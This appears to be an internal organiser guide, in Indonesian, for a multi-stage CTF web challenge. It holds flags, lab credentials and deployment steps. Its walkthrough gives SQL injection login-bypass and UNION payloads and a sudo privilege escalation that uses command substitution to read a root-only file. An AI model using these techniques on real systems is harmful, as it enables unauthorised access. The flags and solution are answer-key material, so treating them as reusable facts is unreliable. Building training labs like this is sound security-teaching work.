# Scarameow Internal Portal + RDP Privesc — Pegangan Panitia (Web F, Rahade)

> Internal panitia saja — jangan ikut dibagikan ke peserta (isinya flag & intended
> solution lengkap).

## Ringkasan cepat

| | |
|---|---|
| **Author** | RahadeMeow |
| **Kategori / Slot** | Web Exploitation, F |
| **CSV name (CTFd)** | `[5F] Scarameow Internal Portal` |
| **Difficulty** | Medium–Hard (multi-stage: SQLi → credential leak → RDP → sudo filter bypass → root) |
| **Port web** | `50601` (host) → `5000` (container) |
| **Port RDP** | `50602` (host) → `3389` (container) |
| **Node** | Homelab 8GB, bind ke Tailscale `100.105.142.39` |
| **Flag (submit ini)** | `TecFest26{pr1v3sc_v14_5ud0_pyth0n_f1lt3r_byp4ss_m30w}` |
| **Flag user/progress** (gak perlu submit) | `TecFest26{rdp_us3r_4ccess}` |
| **Kredensial RDP** | `sadmin` / `S3rv3r_N0t3s_2026!` |

## ⚠️ Konteks penting — baca sebelum deploy

File ini dibuat cepat (±20 menit, keputusan Sanca) dari `rahade/lab-pentest-rdp.zip`.
**Ini BUKAN `rahade_rce.zip`** — yang itu jauh lebih matang (Laravel + Next.js,
`PLAN.md` 17 halaman, IDOR di `/api/vpn/config` & `/api/profile/{id}`, auth bypass
lewat middleware `VerifyCustomToken`) dan sebenarnya yang cocok sama rencana Rahade
di `rahade/readme lab.md`.

`lab-pentest-rdp.zip` aslinya **rig resource-test buat workshop** Rahade ("*Template
1 tim untuk ditest resource-nya dulu di laptop kamu, sebelum di-scale ke 5 tim*"),
bukan deliverable CTF — dipakai di sini semata karena kejar waktu. Kalau ada
kesempatan sebelum atau bahkan setelah wave naik, pertimbangkan ganti ke
`rahade_rce.zip`.

## Yang diubah dari file asli Rahade

| File | Perubahan |
|---|---|
| `src-rdp/Dockerfile` | Flag root diganti `SCARAMEOW{...}` → `TecFest26{pr1v3sc_v14_5ud0_pyth0n_f1lt3r_byp4ss_m30w}` |
| `src-rdp/user.flag` | Flag user diganti `3V1LSCAR4M3OW{...}` → `TecFest26{rdp_us3r_4ccess}` |
| `docker-compose.yml` | Ditulis ulang project-style: 2 service (`web` 50601, `rdp` 50602), pola `${BIND_IP:-100.105.142.39}` sama seperti soal Homelab 8GB lain |
| `web-sqli-old/` | Tidak di-copy (versi lama, tidak dipakai compose manapun) |

Semua perubahan lain (app.py, simpler.py, templates, Dockerfile XFCE/xrdp patch)
**tetap asli dari Rahade**.

## Cara jalanin (lokal / homelab)

```bash
cd web_scarameow_rdp
docker compose build
BIND_IP=100.105.142.39 docker compose up -d   # atau kosongkan BIND_IP buat tes lokal di laptop sendiri
docker compose ps
```

Matiin:

```bash
docker compose down
```

Reset bersih (misal abis dipakai tim lain buat tes):

```bash
docker compose down -v
docker compose up -d --force-recreate
```

## Walkthrough penyelesaian (buat verifikasi panitia)

1. **Buka web** di `http://<host>:50601/`.
2. **Login bypass SQLi** — di form login, isi:
   - Username: `admin' --`
   - Password: apa saja
   → masuk sebagai admin.
3. **Cari tiket mana saja** (misal `/ticket?id=1` biar tahu jumlah kolom tampil benar — 6 kolom).
4. **UNION-based SQLi** — dua jalan, keduanya sudah dites beneran jalan (lihat bagian Status validasi):
   - **`/search?q=`** (dipakai `fetchall()` → nampilin SEMUA row, lebih natural buat peserta temukan):
     ```
     /search?q=zzz%' UNION SELECT id, title, content, content, content, content FROM system_notes --
     ```
   - **`/ticket?id=`** (dipakai `fetchone()` → cuma 1 row, perlu tahu/nebak id yang tepat):
     ```
     /ticket?id=0 UNION SELECT id, title, content, content, content, content FROM system_notes WHERE id=2
     ```
   Hasilnya nampilin isi tabel `system_notes`, salah satu row-nya:
   `"RDP internal: sadmin / S3rv3r_N0t3s_2026!"`.
5. **Login RDP** ke `<host>:50602` (Remote Desktop Connection di Windows / `xfreerdp`
   di Linux) pakai user `sadmin`, password `S3rv3r_N0t3s_2026!`.
   - Flag user ada di `/home/sadmin/user.flag` (opsional, buat progress check).
6. Buka terminal di desktop XFCE, jalankan `sudo -l` → kelihatan boleh jalankan
   `/usr/bin/python3 /opt/admin-tools/simpler.py` sebagai root, NOPASSWD.
7. `simpler.py` nge-blacklist `; & | \` > < \n` doang di argumen, lalu jalankan
   `os.system(f"ping -c 1 {target}")`. Command substitution `$(...)` **tidak**
   kena blacklist:
   ```bash
   sudo /usr/bin/python3 /opt/admin-tools/simpler.py -p '$(cat /root/flag.txt)'
   ```
   Flag kebawa lewat output `ping: unknown host TecFest26{...}` (pesan error
   tepatnya tergantung versi `ping` di image `ubuntu:22.04`).
8. Flag: `TecFest26{pr1v3sc_v14_5ud0_pyth0n_f1lt3r_byp4ss_m30w}`

## Troubleshooting RDP layar hitam (sudah dipatch Rahade di Dockerfile, tapi kalau tetap kejadian)

```bash
docker compose up -d --build
docker logs tecfest-web-scarameow-rdp
docker exec tecfest-web-scarameow-rdp tail -n 50 /var/log/xrdp-sesman.log
docker exec tecfest-web-scarameow-rdp tail -n 50 /var/log/xrdp.log
```

Dari sisi klien Windows: *Show Options → Experience* → matikan *Persistent bitmap
caching*, set ke *Low-speed broadband*, turunkan resolusi (mis. 1280×720) &
color depth ke 16/24-bit.

## Status validasi — sudah end-to-end (update: dites beneran, bukan cuma logika)

Dites lokal di build final (`docker compose up`, image `web_scarameow_rdp-web` +
`web_scarameow_rdp-rdp`), port `50601`/`50602`:

- ✅ **Login SQLi bypass** (`admin' --`): dites beneran lewat `curl` ke container
  yang jalan → `302 → /dashboard`, sesi admin aktif.
- ✅ **UNION SQLi dump `system_notes`**: dites beneran lewat `curl` — baik lewat
  `/search?q=` (dapat semua row) maupun `/ticket?id=...WHERE id=2` (dapat row
  spesifik) — keduanya return `"RDP internal: sadmin / S3rv3r_N0t3s_2026!"`.
- ✅ **`sudo -l` di dalam container `rdp`** (via `docker exec -u sadmin`, bukan
  lewat sesi RDP GUI tapi environment & user-nya identik): konfirmasi
  `(root) NOPASSWD: /usr/bin/python3 /opt/admin-tools/simpler.py*`.
- ✅ **Privesc beneran dieksekusi**: `sudo /usr/bin/python3 /opt/admin-tools/simpler.py -p '$(cat /root/flag.txt)'`
  → output: `ping: TecFest26{pr1v3sc_v14_5ud0_pyth0n_f1lt3r_byp4ss_m30w}: Name or service not known`
  — **flag keluar persis seperti prediksi**.
- ✅ **User flag** (`/home/sadmin/user.flag`): `TecFest26{rdp_us3r_4ccess}` — cocok.
- ⚠️ **Satu-satunya yang BELUM dites**: sesi RDP lewat protokol RDP beneran (buka
  Remote Desktop Connection / xfreerdp, login GUI, buka terminal manual). Port
  `50602` sudah dikonfirmasi listening & xrdp servicenya start normal di log, tapi
  belum ada client RDP di mesin ini buat coba connect GUI-nya. Validasi langkah
  1–7 di atas (login web → RDP → terminal → privesc) semuanya kekonfirmasi lewat
  `docker exec` dengan user & environment yang identik — risiko tersisa cuma soal
  xrdp/XFCE rendering (layar hitam dkk), yang sudah dipatch Rahade di Dockerfile.
  **Tetap disarankan** satu orang coba connect RDP GUI manual sebelum/pas hari-H
  buat mastiin sisi tampilan juga oke.
